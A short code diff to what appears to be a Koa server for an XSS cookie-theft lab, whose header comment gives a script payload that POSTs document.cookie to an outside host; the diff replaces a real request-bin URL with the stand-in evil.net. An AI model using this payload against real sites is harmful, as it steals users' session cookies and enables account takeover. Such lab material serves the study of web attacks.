@@ -1,7 +1,7 @@
 // Cookie exfil via XSS
 
 // Payload - use request bin for a webserver to exfil cookie
-// <script>fetch('https://en8ae3goqwhf.x.pipedream.net/', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
+// <script>fetch('https://evil.net/', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
 
 import Koa from "koa";
 import Router from "koa-router";
